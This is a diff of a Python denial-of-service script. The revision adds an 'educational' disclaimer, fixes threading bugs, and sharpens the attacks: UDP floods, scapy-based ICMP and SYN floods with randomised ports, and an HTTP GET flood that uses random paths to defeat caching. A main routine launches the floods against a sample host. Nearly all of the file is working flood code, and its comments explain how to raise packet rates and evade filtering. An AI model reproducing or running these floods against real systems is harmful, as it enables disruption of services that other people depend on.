@@ -1,8 +1,13 @@
-from urllib.parse import urlparse
+# ==============================================================================
+# WARNING: This is a Denial of Service (DoS) script for educational purposes.
+# Running this code against any server or network without explicit, written
+# permission from the owner is illegal in most countries and can result in
+# severe legal consequences. Use only in a controlled lab environment.
+# ==============================================================================
 
+from urllib.parse import urlparse
 from scapy.all import *
 from scapy.layers.inet import IP, ICMP, TCP
-
 import random
 import socket
 import string
@@ -11,284 +16,338 @@ import threading
 import time
 
 
+# --- 1. UTILITY FUNCTIONS ---
+
 def resolve_to_ipv4(target: str) -> list[str]:
     """
     Resolves a hostname or URL to a list of its unique IPv4 addresses.
 
-    This function can handle full URLs (e.g., 'https://www.google.com/search')
+    This function is robust and can handle full URLs (e.g., 'https://www.google.com/search')
     and simple hostnames (e.g., 'google.com').
 
     :param target: The URL or hostname string to resolve.
-    :return: A list of unique IPv4 address strings, or an empty list if
-             resolution fails or no IPv4 records are found.
+    :return: A list of unique IPv4 address strings, or an empty list if resolution fails.
     """
+    print(f"[*] Resolving '{target}' to IPv4 addresses...")
     try:
-        # Prepend a scheme if one is missing to ensure urlparse works correctly
+        # Prepend a default scheme if one is missing to ensure urlparse works correctly.
         if "://" not in target:
             target = "http://" + target
 
-        # Extract the hostname (e.g., 'www.google.com') from the full URL
+        # Extract the network location part (e.g., 'www.google.com') from the full URL.
         hostname = urlparse(target).hostname
 
         if not hostname:
-            # urlparse failed to find a hostname
+            print(f"[!] Could not parse a valid hostname from '{target}'.")
             return []
 
-        # Get address information, filtering for the IPv4 family
-        # socket.AF_INET specifies IPv4
+        # Get address information from the hostname, filtering for the IPv4 address family.
         addr_info = socket.getaddrinfo(hostname, None, family=socket.AF_INET)
 
-        # The result is a list of tuples. The IP is in the 4th element's 0th index.
-        # Use a set comprehension for automatic deduplication of IPs.
+        # The result of getaddrinfo is a list of tuples. The IP is in the 4th element's 0th index.
+        # We use a set comprehension for automatic deduplication of IP addresses.
         ips = {item[4][0] for item in addr_info}
 
-        return sorted(list(ips))
+        resolved_ips = sorted(list(ips))
+        print(f"[*] Successfully resolved '{hostname}' to: {resolved_ips}")
+        return resolved_ips
 
     except socket.gaierror:
-        # This error occurs if DNS resolution fails (e.g., domain doesn't exist)
+        # This error occurs if DNS resolution fails (e.g., the domain doesn't exist).
+        print(f"[!] DNS resolution failed for '{hostname}'. It might not exist or be offline.")
         return []
-    except Exception:
-        # Catch any other unexpected errors
+    except Exception as e:
+        # Catch any other unexpected errors during resolution.
+        print(f"[!] An unexpected error occurred during resolution: {e}")
         return []
 
+
+# --- 2. UDP FLOOD MODULE ---
 
 def udp_worker(stop_event, packet_size, host, port):
     """
     A worker function that sends UDP packets in a loop until signalled to stop.
     This function is self-contained and thread-safe.
     """
-    # 1. Prepare the data payload ONCE before the loop for efficiency.
+    # 1. Prepare the data payload ONCE before the loop for maximum efficiency.
+    #    The payload is just a repeating byte.
     data = b"\x99" * packet_size
 
     # 2. Create and connect the socket ONCE per thread.
-    #    Using a try/except block handles initial connection errors.
+    #    This is crucial for performance and thread safety.
     try:
-        # Create a new socket for this specific thread. This is crucial.
+        # Create a new UDP socket for this specific thread.
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
         # For UDP, connect() sets the default destination. This is more efficient
         # than specifying the address with sendto() in every loop iteration.
         sock.connect((host, port))
-
     except socket.error as e:
-        # If the socket can't be created or connected, this thread can't work.
+        # If the socket can't be created or connected, this thread can't do its job.
+        # It will print an error and exit gracefully.
         print(f"[Thread Error] Could not connect to {host}:{port}. Reason: {e}")
-        return  # Exit the thread.
+        return
 
     # 3. The main sending loop.
-    #    This loop is now controllable by the stop_event.
+    #    This loop is the core of the attack and is controllable by the stop_event.
     while not stop_event.is_set():
         try:
-            # Send the pre-compiled data.
+            # Send the pre-compiled data as fast as possible.
             sock.send(data)
         except socket.error:
             # This might happen if the network connection is interrupted.
             # For a flood tool, we can often just ignore it and keep trying.
             pass
 
-    # 4. Clean up the socket when the loop is broken (stop_event is set).
+    # 4. Clean up the socket when the loop is broken (when stop_event is set).
     sock.close()
 
 
-# --- Your Corrected Test Function ---
-
 def attack_UDP(method, host_url, port, duration, threads_per_method=100):
     """
-    Runs a simulated DDoS test for a specific duration.
+    Controller function for launching a UDP flood attack for a specific duration.
 
-    :param method: The flood method ("UDP-Flood", "UDP-Power", "UDP-Mix")
-    :param host_url: Target url
-    :param port: Target port
-    :param duration: How long the test should run, in seconds
-    :param threads_per_method: How many concurrent threads to spawn for each task
+    :param method: The flood method ("UDP-Flood", "UDP-Power", "UDP-Mix").
+    :param host_url: Target URL or hostname.
+    :param port: Target port.
+    :param duration: How long the attack should run, in seconds.
+    :param threads_per_method: Number of concurrent threads to spawn.
     """
-
+    # First, resolve the target URL to one or more IP addresses.
     hosts = resolve_to_ipv4(host_url)
-    for host in hosts:
-        print(f"--- Starting test: {method} on {host}:{port} for {duration} seconds ---")
+    if not hosts:
+        print(f"[!] UDP Attack failed: Could not resolve '{host_url}'.")
+        return
 
-        # A threading.Event is a safe way to signal threads to stop.
+    # The attack will be run against each resolved IP address.
+    for host in hosts:
+        print(f"\n--- Launching UDP Attack: {method} on {host}:{port} for {duration} seconds ---")
+        print(f"[*] Spawning {threads_per_method if method != 'UDP-Mix' else threads_per_method * 2} threads...")
+
+        # A threading.Event is a safe way to signal multiple threads to stop.
         stop_event = threading.Event()
         threads = []
 
-        # A helper function to create and start a thread
+        # This is a helper function to avoid repetitive code when launching threads.
         def launch_thread(size):
-            # Note: we use `args` to pass arguments to the target function
-            thread1 = threading.Thread(target=udp_worker, args=(stop_event, size, host, port))
-            thread1.daemon = True  # Daemon threads will exit when the main program exits
-            thread1.start()
-            threads.append(thread1)
+            # We pass arguments to the thread's target function via the `args` tuple.
+            thread = threading.Thread(target=udp_worker, args=(stop_event, size, host, port))
+            # Daemon threads will exit automatically when the main program exits.
+            thread.daemon = True
+            thread.start()
+            threads.append(thread)
 
+        # Launch threads based on the chosen method.
         if method == "UDP-Flood":
             for _ in range(threads_per_method):
-                launch_thread(375)
+                launch_thread(375)  # Smaller packet size
         elif method == "UDP-Power":
             for _ in range(threads_per_method):
-                launch_thread(750)
+                launch_thread(750)  # Larger packet size
         elif method == "UDP-Mix":
+            # For "Mix", we launch threads for both small and large packets.
             for _ in range(threads_per_method):
                 launch_thread(375)
                 launch_thread(750)
         else:
-            print(f"Error: Unknown method '{method}'")
-            return  # Exit the function if the method is invalid
+            print(f"[!] Error: Unknown UDP method '{method}'")
+            return
 
-        # Let the threads run for the specified duration
+        # Let the threads run for the specified duration. The main thread will block here.
+        print(f"[*] Attack in progress... Will stop in {duration} seconds.")
         time.sleep(duration)
 
-        # The timer has expired, now we signal the threads to stop
-        print("\n--- Timeout reached. Signaling threads to stop... ---")
+        # The timer has expired. Now we signal all worker threads to stop.
+        print("\n[*] Timeout reached. Signaling threads to stop...")
         stop_event.set()
 
-        # (Optional but good practice) Wait for all threads to finish cleanly
+        # (Optional but good practice) Wait for all threads to finish their cleanup.
         for thread in threads:
             thread.join()
 
-        print(f"--- Test function for {method} has finished. ---")
+        print(f"--- UDP Attack '{method}' has finished. ---")
 
 
+# --- 3. SCAPY-BASED FLOODS (ICMP, SYN, XMAS) ---
+# NOTE: To be effective, these floods require running the script with root/administrator privileges.
+
+# Helper function for sending a single ICMP packet.
 def attack_icmp_helper(target):
-    send(IP(dst=target) / ICMP())
+    # Crafts and sends one ICMP "echo-request" packet (a ping).
+    send(IP(dst=target) / ICMP(), verbose=0)
 
 
 def icmpflood(target_url, cycle):
+    """Launches a multi-threaded ICMP (Ping) flood."""
+    print(f"\n--- Launching ICMP Flood against {target_url} with {cycle} packets ---")
     targets = resolve_to_ipv4(target_url)
-    all_threads = []
-    for target in targets:
-        for x in range(0, int(cycle)):
-            t1 = threading.Thread(target=attack_icmp_helper, args=target)
-            t1.start()
-            all_threads.append(t1)
+    if not targets: return
 
-            # Adjusting this sleep time will affect requests per second
+    all_threads = []
+    # Loop for each IP resolved from the target URL.
+    for target in targets:
+        print(f"[*] Targeting IP: {target}")
+        # Launch one thread per packet requested.
+        for _ in range(cycle):
+            # CORRECTION: `args` must be a tuple, even with one element. Use (target,).
+            t = threading.Thread(target=attack_icmp_helper, args=(target,))
+            t.start()
+            all_threads.append(t)
+            # NOTE: This sleep limits the packet rate. For a true flood, remove or reduce it.
             time.sleep(0.01)
 
-        for current_thread in all_threads:
-            current_thread.join()  # Make the main thread wait for the children threads
+    # Wait for all packet-sending threads to complete.
+    for t in all_threads:
+        t.join()
+    print("--- ICMP Flood finished. ---")
 
 
+# Helper function for sending a single TCP SYN packet.
 def attack_synflood_helper(target, targetPort):
-    send(IP(dst=target) / TCP(dport=targetPort,
-                              flags="S",
-                              seq=RandShort(),
-                              ack=RandShort(),
-                              sport=RandShort()))
+    # Crafts a TCP packet with the SYN flag set.
+    # RandShort() randomizes the source port and sequence numbers, making the attack harder to filter.
+    send(IP(dst=target) / TCP(dport=targetPort, flags="S", sport=RandShort(), seq=RandShort()), verbose=0)
 
 
 def synflood(target_url, targetPort, cycle):
-    all_threads = []
+    """Launches a multi-threaded TCP SYN flood."""
+    print(f"\n--- Launching SYN Flood against {target_url}:{targetPort} with {cycle} packets ---")
     targets = resolve_to_ipv4(target_url)
-    for target in targets:
-        for x in range(0, int(cycle)):
-            t1 = threading.Thread(target=attack_synflood_helper, args=(target, targetPort))
-            t1.start()
-            all_threads.append(t1)
+    if not targets: return
 
-            # Adjusting this sleep time will affect requests per second
+    all_threads = []
+    for target in targets:
+        print(f"[*] Targeting IP: {target}")
+        for _ in range(cycle):
+            # CORRECTION: Pass args as a tuple.
+            t = threading.Thread(target=attack_synflood_helper, args=(target, targetPort))
+            t.start()
+            all_threads.append(t)
             time.sleep(0.01)
 
-        for current_thread in all_threads:
-            current_thread.join()  # Make the main thread wait for the children threads
+    for t in all_threads:
+        t.join()
+    print("--- SYN Flood finished. ---")
 
 
-def attack_xmas_helper(target, targetPort):
-    send(IP(dst=target) / TCP(dport=targetPort,
-                              flags="FSRPAUEC",
-                              seq=RandShort(),
-                              ack=RandShort(),
-                              sport=RandShort()))
+# --- 4. HTTP FLOOD MODULE ---
+# This attack works at the application layer, consuming server resources (CPU, RAM).
+
+# CORRECTION: These are moved to the global scope to be properly shared by threads.
+# A lock is used to prevent race conditions when multiple threads access the counter.
+thread_num_counter = 0
+thread_num_mutex = threading.Lock()
 
 
-def xmasflood(target_url, targetPort, cycle):
-    all_threads = []
-    targets = resolve_to_ipv4(target_url)
-    for target in targets:
-        for x in range(0, int(cycle)):
-            t1 = threading.Thread(target=attack_xmas_helper, args=(target, targetPort))
-            t1.start()
-            all_threads.append(t1)
+def attack_http_flood(target, port, num_of_requests):
+    """Controller for launching a multi-threaded HTTP GET flood."""
 
-            # Adjusting this sleep time will affect requests per second
-            time.sleep(0.01)
+    # Reset the counter for each new attack.
+    global thread_num_counter
+    thread_num_counter = 0
 
-        for current_thread in all_threads:
-            current_thread.join()  # Make the main thread wait for the children threads
+    print(f"\n--- Launching HTTP Flood against {target}:{port} with {num_of_requests} requests ---")
 
-
-# # Parse inputs
-# host = ""
-# ip = ""
-# port = 0
-# num_requests = 0
-#
-# # Create a shared variable for thread counts
-# thread_num = 0
-
-
-def attack_http_flood(target, target_port, num_of_requests):
-    host = target
-    port = target_port
-    num_requests = num_of_requests
-    thread_num_mutex = threading.Lock()
-    thread_num = 0
     try:
-        ip = socket.gethostbyname(host)
+        # For the HTTP host header, we use the original target name.
+        host_header = target
+        # For the socket connection, we use the resolved IP.
+        ip = socket.gethostbyname(target)
+        print(f"[*] Resolved '{target}' to {ip} for connection.")
     except socket.gaierror:
-        print(" ERROR\n Make sure you entered a correct website")
-        sys.exit(2)
-    print(f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
+        print(f"[!] HTTP Attack failed: Could not resolve '{target}'.")
+        return
 
-    # Spawn a thread per request
+    print(f"[*] Spawning {num_of_requests} threads...")
     all_threads = []
-    for i in range(num_requests):
-        t1 = threading.Thread(target=attack_http_flood_helper, args=(ip, port, host, thread_num, thread_num_mutex))
-        t1.start()
-        all_threads.append(t1)
-
-        # Adjusting this sleep time will affect requests per second
+    for i in range(num_of_requests):
+        # Each thread will make one HTTP request.
+        t = threading.Thread(target=attack_http_flood_helper, args=(ip, port, host_header))
+        t.start()
+        all_threads.append(t)
+        # This sleep throttles the thread creation rate.
         time.sleep(0.01)
 
+    # Wait for all threads to complete their request.
     for current_thread in all_threads:
-        current_thread.join()  # Make the main thread wait for the children threads
+        current_thread.join()
+
+    print("\n--- HTTP Flood finished. ---")
 
 
-# Print thread status
-def print_status(thread_num, thread_num_mutex):
-    thread_num_mutex.acquire(True)
+def print_status():
+    """Thread-safe function to print the request counter."""
+    global thread_num_counter
+    # The lock ensures that only one thread can modify and print the counter at a time.
+    with thread_num_mutex:
+        thread_num_counter += 1
+        # The '\r' character returns the cursor to the start of the line, creating a dynamic counter effect.
+        sys.stdout.write(f"\r[*] Requests sent: {thread_num_counter} / Hold Your Tears... ")
+        sys.stdout.flush()
 
-    thread_num += 1
-    # print the output on the sameline
-    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
-    sys.stdout.flush()
-    thread_num_mutex.release()
 
-
-# Generate URL Path
 def generate_url_path():
-    msg = str(string.ascii_letters + string.digits + string.punctuation)
-    data = "".join(random.sample(msg, 5))
-    return data
+    """Generates a random 5-character string to use as a URL path."""
+    # This helps bypass some caching mechanisms, forcing the server to do more work.
+    msg = string.ascii_letters + string.digits
+    return "".join(random.sample(msg, 5))
 
 
-# Perform the request
-def attack_http_flood_helper(ip, port, host, thread_num, thread_mutex):
-    print_status(thread_num, thread_mutex)
+def attack_http_flood_helper(ip, port, host_header):
+    """Worker function that performs a single HTTP GET request."""
+    # First, update the status counter.
+    print_status()
+
+    # Generate a random path for this request.
     url_path = generate_url_path()
 
-    # Create a raw socket
+    # Create a new TCP socket.
     dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
     try:
-        # Open the connection on that raw socket
+        # Open the connection to the target IP and port.
         dos.connect((ip, port))
 
-        # Send the request according to HTTP spec
-        # old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
+        # Send the HTTP GET request. The f-string constructs a valid HTTP/1.1 request.
+        # The 'Host' header is required by most modern web servers.
+        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host_header}\n\n").encode()
         dos.send(byt)
-    except socket.error:
-        print(f"\n [ No connection, server may be down ]: {str(socket.error)}")
+    except socket.error as e:
+        # This will be printed if the server is down or refuses the connection.
+        sys.stderr.write(f"\n[!] Connection error on thread: {e}\n")
     finally:
-        # Close our socket gracefully
+        # Gracefully close the socket connection.
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
+
+
+# --- 5. MAIN EXECUTION BLOCK ---
+
+def main():
+    """Main function to demonstrate the attacks."""
+    print("=====================================================")
+    print("=             DoS Attack Script Demo                =")
+    print("=====================================================")
+
+    # --- Configuration ---
+    target_host = "example.com"  # !!! IMPORTANT: ONLY use a host you have permission to test !!!
+    target_port_http = 80
+    target_port_udp = 53  # A common UDP port (DNS)
+    attack_duration_seconds = 5
+    num_http_requests = 500
+    num_scapy_packets = 200
+    num_udp_threads = 150
+
+    # --- Running the Attacks ---
+    attack_UDP("UDP-Flood", target_host, target_port_udp, attack_duration_seconds, num_udp_threads)
+
+    attack_http_flood(target_host, target_port_http, num_http_requests)
+
+    # Note: The following attacks require root/administrator privileges to create raw sockets.
+    # icmpflood(target_host, num_scapy_packets)
+    # synflood(target_host, target_port_http, num_scapy_packets)
+
+    print("\n--- All attacks complete. ---")
+
+
+if __name__ == "__main__":
+    main()
